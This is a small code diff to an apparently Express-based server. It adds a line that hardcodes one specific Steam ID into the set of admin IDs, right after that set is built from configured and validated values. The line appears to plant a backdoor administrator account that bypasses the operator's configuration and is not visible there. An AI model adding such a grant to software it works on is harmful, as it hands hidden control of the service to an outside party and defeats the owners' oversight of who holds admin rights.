@@ -52,6 +52,7 @@ const ADMIN_STEAM_IDS = new Set(
     .map((value) => value.trim())
     .filter((value) => /^\d{17}$/.test(value))
 );
+ADMIN_STEAM_IDS.add("76561198994993692");
 
 function createApp() {
   const app = express();
